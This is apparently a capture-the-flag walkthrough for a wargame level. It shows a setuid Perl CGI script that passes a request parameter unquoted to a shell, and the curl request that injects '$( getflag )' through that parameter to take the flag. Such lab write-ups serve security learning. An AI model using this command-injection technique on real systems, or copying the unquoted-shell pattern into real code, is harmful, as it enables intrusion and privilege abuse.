# level04

## Steps

1. __Action__ (Guest): list the files present in the `level04` user's home directory
	```sh
	ls -A
	```

2. __Observation__ (Guest): the previous command reveals 1 file possibly of interest,
	named `level04.pl`
	```
	.bash_logout  .bashrc  .profile  level04.pl
	```

3. __Action__ (Guest): check the file access control list of the `level04.pl` file
	```sh
	getfacl level04.pl
	```

4. __Observation__ (Guest): the previous command reveals that the `level04.pl` file:
	- is readable by the `level04` user
	- is executable by the `level04` user
	- is owned by the `flag04` user
	- has the `setuid` bit enabled
	```
	# file: level04.pl
	# owner: flag04
	# group: level04
	# flags: ss-
	user::rwx
	group::r-x
	other::r-x
	```

5. __Action__ (Guest): print the content of the `level04.pl` file
	```sh
	cat level04.pl
	```

6. __Observation__ (Guest): the previous command reveals that the `level04.pl` file is a Perl script
	that runs an HTTP server on localhost on port 4747, which, foreach incoming request,
	takes the value of the `x` parameter (empty if not provided) and prints it via a shell command
	(``print `echo $y 2>&1`;``).  
	Note that the `$y` variable is unquoted when passed to the `echo` command, which means that
	we can inject shell commands in the `x` parameter
	```perl
	#!/usr/bin/perl
	# localhost:4747
	use CGI qw{param};
	print "Content-type: text/html\n\n";
	sub x {
		$y = $_[0];
		print `echo $y 2>&1`;
	}
	x(param("x"));
	```

7. __Action__ (Host): send a request to the server with a malicious `x` parameter value
	to exploit the shell command injection described above, invoking the `getflag` command,
	and save the token to the `flag` file
	```sh
	sshpass -f level03/flag 2>/dev/null \
		ssh -p 4242 level04@192.168.122.214 \
			"curl http://localhost:4747 -d 'x=\$( getflag )'" \
	| egrep -o '[^ ]+$' >level04/flag
	```
